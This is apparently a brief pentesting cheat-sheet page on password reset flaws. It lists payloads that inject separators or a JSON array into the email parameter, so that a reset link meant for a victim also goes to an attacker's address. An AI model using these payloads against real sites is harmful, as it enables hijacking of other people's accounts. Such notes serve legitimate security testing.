---
description: Password Reset Vulnerabilities
---

# Password Reset

### E-mail separators

Try to send the password reset e-mail to multiple addresses using separators:&#x20;

```
email=victim@mail.com,hacker@mail.com 
email=victim@mail.com;hacker@mail.com 
email=victim@mail.com%20hacker@mail.com 
email=victim@mail.com|hacker@mail.com 
{"email":["victim@mail.com","hacker@mail.com"]} 
```